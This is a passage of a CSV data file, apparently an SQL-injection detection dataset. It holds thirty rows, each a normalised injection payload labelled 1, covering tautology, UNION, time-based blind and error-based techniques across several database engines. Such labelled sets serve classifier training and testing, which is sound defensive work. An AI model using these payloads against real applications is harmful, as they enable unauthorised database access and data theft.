row_index,payload_norm,label,sqli_type_hint
5670,1 where 4519 = 4519,1,
5671,"1"" where 9901 = 9901 and ( 2455 = 8499 ) *8499--",1,
5672,"1"" ) where 2496 = 2496",1,
5673,1' where 4945 = 4945,1,
5674,select ( case when ( 3435 = 4011 ) then 1 else 3435* ( select 3435 from master..sysdatabases ) end ) --,1,
5675,"1 ) as asmt where 4986 = 4986 union all select null,null#",1,
5676,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'kyos' like 'kyos",1,
5677,select sleep ( 5 ) and ( '%' = ',1,
5678,"-9535"" order by 1--",1,
5679,"1"" ) as awdg where 9512 = 9512",1,
5680,"1"" ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""wfwg"" like ""wfwg",1,
5681,1' rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and 'nbxw' = 'nbxw,1,
5682,"1' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,
5683,"1"" ) ) ) union all select null,null,null,null--",1,
5684,"1 ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
5685,"1"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""kssm"" = ""kssm",1,
5686,"1' where 4185 = 4185 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,
5687,"1"" where 1982 = 1982",1,
5688,"1' in boolean mode ) union all select null,null#",1,
5689,"-4318"" ) as vpvt where 5543 = 5543 union all select 5543,5543,5543,5543,5543,5543--",1,
5690,"1"" ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""abcw"" = ""abcw",1,
5691,"1 where 6412 = 6412 union all select null,null,null,null,null,null,null--",1,
5692,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'qfls' = 'qfls",1,
5693,1' ) ) as bewk where 3672 = 3672 or sleep ( 5 ) --,1,
5694,"1,updatexml ( 2917,concat ( 0x2e,0x7171706a71, ( select ( elt ( 2917 = 2917,1 ) ) ) ,0x717a767a71 ) ,8295 )",1,
5695,"1'+ ( select bruk where 1400 = 1400 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) +'",1,
5696,"1%"" union all select null--",1,
5697,1 ) ) as foul where 4361 = 4361 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
5698,1%' ) ) and 7989 = 3457,1,
5699,1%' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( '%' = ',1,
